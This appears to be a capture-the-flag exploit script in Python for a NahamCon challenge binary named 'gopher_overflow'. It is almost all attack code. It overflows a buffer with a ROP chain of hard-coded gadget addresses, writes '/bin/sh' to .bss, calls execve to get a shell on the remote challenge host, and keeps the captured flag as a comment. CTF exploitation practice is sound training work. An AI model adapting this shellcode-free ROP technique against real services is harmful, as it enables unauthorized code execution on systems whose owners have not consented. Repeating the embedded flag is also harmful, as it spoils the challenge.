#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './gopher_overflow'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'challenge.nahamcon.com', 'port':30950})
env.select()

#==========

binf = ELF(bin_file)
addr_bss            = binf.sep_section['.bss']
addr_pop_rcx        = 0x000000000040c5bf                # pop rcx; sal edx, 0xf; sub al, 0xc0; inc eax; ret;
addr_pop_rax        = 0x0000000000404968                # pop rax; pop rbp; ret;
addr_pop_rdx        = 0x000000000047a67a
addr_mov_mrax_rcx   = 0x000000000042cb73                # mov qword ptr [rax], rcx; ret;
addr_pop_rbx        = 0x0000000000404aa1
addr_mov_rsi_rcx_rdi_rbx_syscall = 0x00000000004036c6   # mov rsi, rcx; mov rdi, rbx; syscall;

#==========

def attack(conn, **kwargs):
    exploit  = b'a'*0x20
    exploit += p64(addr_bss)
    exploit  = exploit.ljust(0x90, b'\x00')
    exploit += flat(addr_bss, 0x1000, 0x1000)
    exploit  = exploit.ljust(0xf0, b'\x00')
    exploit += flat(
            addr_pop_rcx, b'/bin/sh\x00', addr_pop_rax, addr_bss, 0xdeadbeef, addr_mov_mrax_rcx,
            addr_pop_rbx, addr_bss,
            addr_pop_rcx, 0,
            addr_pop_rdx, 0,
            addr_pop_rax, constants.SYS_execve, 0xdeadbeef,
            addr_mov_rsi_rcx_rdi_rbx_syscall,
    )
    conn.sendlineafter(b'gopher? ', exploit)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag{6a34c27f3bb3b25d98e7c1a1896217db}

if __name__=='__main__':
    main()

#==========
